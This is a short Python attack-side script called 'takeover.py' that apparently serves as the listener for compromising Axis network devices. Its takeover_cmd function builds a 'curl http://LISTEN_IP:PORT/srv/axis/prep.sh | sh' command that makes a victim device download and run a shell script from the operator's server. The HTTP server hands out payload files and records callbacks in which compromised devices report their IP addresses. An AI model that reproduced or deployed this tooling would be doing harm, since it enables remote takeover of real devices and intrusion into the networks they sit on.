#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO
import binascii
import sys

srv_run = True

def takeover_cmd(listen_ip: str, listen_port: int, target_ip: str, target_port: int, extra: str, www: bool=False) -> str:
    cmd_str = f"curl http://{listen_ip}:{listen_port}/srv/axis/prep.sh | sh -s -- {listen_ip}:{listen_port} {1 if www else 0} {target_ip} {target_port} '{extra}'"
    # cmd_str = f"ping {listen_ip}"
    return cmd_str

def run_server(listen_port: int):

    class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

        def do_GET(self):
            if self.path == '/':
                self.send_response(200)
                self.end_headers()
                return
            try:
                file = open(self.path[1:], 'rb').read()
                self.send_response(200)
                self.send_header('Content-type', 'application/zip')
                self.end_headers()
                self.wfile.write(bytes(file))
            except:
                self.send_response(404)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(b'404 - not found')

        def do_POST(self):
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length).decode('utf-8').split(":")
            self.send_response(200)
            self.end_headers()
            response = BytesIO()
            self.wfile.write(response.getvalue())
            if (body[0] == 'ip'):
                from termcolor import cprint
                print()
                cprint(f"Device reported CIDR IP: ", "green", attrs=["bold"], end="")
                cprint(f"{binascii.a2b_hex(body[1]).decode('utf-8')}\n", "white", attrs=["bold"])

        def do_QUIT(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Good bye.\n')
            global srv_run
            srv_run = False

    httpd = HTTPServer(('0.0.0.0', listen_port), SimpleHTTPRequestHandler)

    while (srv_run == True):
        httpd.handle_request()


if __name__ == "__main__":

    if (len(sys.argv) < 2):
        print("Not enough arguments. Exiting.")
        print("takeover.py LISTEN_PORT")
        exit(0)
    if (len(sys.argv) > 2):
        print("Too many arguments. Exiting.")
        print("takeover.py LISTEN_PORT")
        exit(0)
        
    run_server(int(sys.argv[1]))

